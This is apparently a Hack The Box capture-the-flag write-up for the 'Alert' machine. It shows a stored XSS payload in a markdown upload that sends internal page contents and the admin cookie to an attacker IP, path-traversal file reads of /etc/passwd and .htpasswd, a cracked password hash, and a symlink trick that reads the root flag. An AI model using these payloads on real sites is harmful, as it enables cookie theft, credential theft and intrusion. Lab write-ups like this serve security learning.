---
title: alert
date: 2024-12-29
draft: false
tags:
  - htb
  - easy
  - linux
category: Write-up
description: Alert is an easy Linux box where an XSS on a markdown site leads to an internal Arbitrary File Read, exposing a password hash that’s cracked for SSH access; local process enumeration reveals a scheduled PHP script writable by the management group, allowing overwrite for root code execution.
---
# Initial Recon

We found there are two forbidden directories and some other accessible files 
```
→ /uploads
→ /messages 
→ messages.php
→ contact
```


So we got a home web page where we can upload .md file 

## Burp suite

We confirmed it is vulnerable 

![[alertsrc.png]]
→ And we figured out the file we uploading is saved on the `database` and we can **share it using a link** that is provided to view it.

![[alert1.png]]

→ Then we went to the contact page where we can able to send a message to admin

---

>Note: For XSS attack someone need to click on the link, So we gonna check that the admin will click the link 

---
→ We set a http server on our machine and set a message to a admin 

```
http://<our-ip>:<port>/<somefile>
```

 To check the admin is clicking the link and he did, the file is downloaded from our machine 

 ---
> **Key Points :**
> 1. The webpage which is vulnerable for XSS and it stores the file as link
> 2. The admin is clicking the link which we sending from contact page

---

# User
So we gonna make the script executed by the admin, and data in index.php?page=messages gonna be retrieved along with admin cookie

> **`Payload plays a crucial role here`**
 
We gonna upload a payload then we gonna use the link which is generated and send it to the admin and he clicks and system command will be executed by admin

Place the payload inside the `Script Tags`
```javascript
var readfile="http://alert.htb/index.php?page=messages";
	fetch(readfile)
		.then(response => response.text())
		.then(data => {     
		    fetch("http://10.10.14.39:9001/?data=" + encodeURIComponent(data) + "&cookie=" + document.cookie);
		})
		.catch(error => fetch("http://10.10.14.39:9001/?err=" + error.message));

```

⇒ output on our python sever on port 9001
```
GET / data=%3C!DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20href%3D%22css%2Fstyle.css%22%3E%0A%20%20%20%20%3Ctitle%3EAlert%20-%20Markdown%20Viewer%3C%2Ftitle%3E%0A%3C%2Fhead%3E%0A%3Cbody%3E%0A%20%20%20%20%3Cnav%3E%0A%20%20%20%20%20%20%20%20%3Ca%20href%3D%22index.php%3Fpage%3Dalert%22%3EMarkdown%20Viewer%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%3Ca%20href%3D%22index.php%3Fpage%3Dcontact%22%3EContact%20Us%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%3Ca%20href%3D%22index.php%3Fpage%3Dabout%22%3EAbout%20Us%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%3Ca%20href%3D%22index.php%3Fpage%3Ddonate%22%3EDonate%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%3Ca%20href%3D%22index.php%3Fpage%3Dmessages%22%3EMessages%3C%2Fa%3E%20%20%20%20%3C%2Fnav%3E%0A%20%20%20%20%3Cdiv%20class%3D%22container%22%3E%0A%20%20%20%20%20%20%20%20%3Ch1%3EMessages%3C%2Fh1%3E%3Cul%3E%3Cli%3E%3Ca%20href%3D%27messages.php%3Ffile%3D2024-03-10_15-48-34.txt%27%3E2024-03-10_15-48-34.txt%3C%2Fa%3E%3C%2Fli%3E%3C%2Ful%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3Cfooter%3E%0A%20%20%20%20%20%20%20%20%3Cp%20style%3D%22color%3A%20black%3B%22%3E%C2%A9%202024%20Alert.%20All%20rights%20reserved.%3C%2Fp%3E%0A%20%20%20%20%3C%2Ffooter%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A%0A&cookie= HTTP/1.1" 200 -

```

→ If we **decode** it 

```
:
<div class="container">
        <h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
    </div>
:
```

 → We can use that parameter "`messages.php?file=2024-03-10_15-48-34.txt`" to execute system commands because it can access system files, and we gonna use it to retrieve information
 
`Modified payload` to execute system commands because that parameter reads files from system 
``` javascript
var readfile="http://alert.htb/messages.php?file=../../../../etc/passwd";
  fetch(readfile)
    .then(response => response.text())
    .then(data => {     
      fetch("http://10.10.14.39:9001/?data=" + encodeURIComponent(data) + "&cookie=" + document.cookie);
    })
    .catch(error => fetch("http://10.10.14.39:9001/?err=" + error.message));
```

The process of getting the link and we send that link to admin process is repetitive 

→ As decoded we found users
``` output
- admin
- albert
- david 
```

→ Here after same payload just change the path and repeat the process like `../../../../etc/hosts`
	⇒ we see that it has another domain name called statistics.alert.htb

Then change it to `../../../../etc/apache2/sites-available/000-default.conf` 
⇒ To check for `apache configuration` 
⇒`authenticated user credentials` stored directory path mentioned there 

![[alert2.png]]

⇒ `/var/www/statistics.alert.htb/.htpasswd`
   
⇒ We got creds 

>`albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/` → `manchesterunited`

Logged in as an `albert`

# Root

```
ps aux    
```
→ We seen that there is a folder runs a /usr/bin/php -`/opt/website-monitor`

→ which host on `127.0.0.1:8080`

→ When we check on it we see a monitor folder which is `read, write, executable by all users`

```
touch rootflag.txt ⇒ we create a dumb txt file 
```

```
ln -sf /root/root.txt rootflag.txt 
```

⇒ We knew where the real root.txt so we made a `symbolic link` which is forced to open the root.txt when we open `rootflag.txt`

→ Now `rootflag.txt` has the contents of root.txt due to we can't access it in the terminal we used curl on the local host:port it hosting we got the content 
```
eg:
albert@alert:/opt/website-monitor/monitors$ cat rootflag.txt
cat: rootflag.txt: Permission denied

albert@alert:/opt/website-monitor/monitors$ curl http://127.0.0.1:8080/monitors/rootflag.txt
```

```
rootflag.txt - e9e1d744be37421134e24aa84b1fa4a7
```

Gained `root`